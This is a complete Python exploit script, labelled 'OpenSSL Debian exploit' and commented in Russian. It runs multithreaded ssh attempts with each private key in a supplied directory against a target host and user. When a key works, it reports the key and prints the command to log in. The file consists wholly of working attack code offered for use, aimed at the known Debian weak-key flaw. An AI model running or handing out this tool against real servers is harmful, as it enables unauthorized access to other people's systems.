#!/bin/python
import queue
import os
import time
from threading import Thread
import sys
import subprocess

# Класс, который содержит только булево значение,
# которое будет True, если какой-то поток найдет ключ
class End():
    def __init__(self):
        self.end = False

    def Finish(self):
        self.end = True

    def GetEnd(self):
        return self.end


# Класс потока
class Connection(Thread):
    def __init__(self, QueueDir, TheEnd, dir, host, user, port='22'):
        Thread.__init__(self)
        self.QueueDir = QueueDir
        self.TheEnd = TheEnd
        self.dir = dir
        self.host = host
        self.user = user
        self.port = port

    def run(self):
        while (not self.TheEnd.GetEnd()) and (not self.QueueDir.empty()):
            key = self.QueueDir.get()

            cmd = 'ssh -l ' + self.user
            cmd += ' -p ' + self.port
            cmd += ' -o PasswordAuthentication=no'
            cmd += ' -i ' + self.dir + '/' + key
            cmd += ' ' + self.host + ' exit; echo $?'

            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            pout, perr = process.communicate()

            # Для отладки раскомментируйте следующую строку.
            # Она покажет ошибки, сообщенные ssh
            # print(perr.decode())

            # Раскодируйте байты в строку
            pout_str = pout.decode()

            if pout_str.lstrip().rstrip() == '0':
                self.TheEnd.Finish()
                print('')
                print('Ключ найден в файле: ' + key)
                print('Execute: ssh -l%s -p%s -i %s/%s %s' % (self.user, self.port, self.dir, key, self.host))
                print('')


print('\n-OpenSSL Debian exploit-')

if len(sys.argv) < 4:
    print('./exploit.py <dir> <host> <user> [[port] [threads]]')
    print('    <dir>: Путь к приватным ключам SSH (ex. /home/john/keys) без последней косой черты')
    print('    <host>: {Хост "IP"}')
    print('    <user>: Пользователь хоста')
    print('    [port]: SSH-порт хоста (default 22)')
    print('    [threads]: Количество потоков (default 4) Слишком большое число – это плохо')

    sys.exit(1)

dir = sys.argv[1]
host = sys.argv[2]
user = sys.argv[3]

if len(sys.argv) <= 4:
    port = '22'
    threads = 4
else:
    if len(sys.argv) <= 5:
        port = sys.argv[4]
        threads = 4
    else:
        port = sys.argv[4]
        threads = sys.argv[5]

ListDir = os.listdir(dir)
QueueDir = queue.Queue()
TheEnd = End()

for i in range(len(ListDir)):
    if ListDir[i].find('.pub') == -1:
        QueueDir.put(ListDir[i])

initsize = QueueDir.qsize()
tested = 0

for i in range(0, int(threads)):
    Connection(QueueDir, TheEnd, dir, host, user, port).start()


while (not TheEnd.GetEnd()) and (not QueueDir.empty()):
    time.sleep(5)
    actsize = QueueDir.qsize()
    speed = (initsize - tested - actsize) / 5
    tested = initsize - actsize

    print('Протестировано %i ключей | Оставшийся %i ключи | Прибл. Скорость %i/сек.' % (tested, actsize, speed))
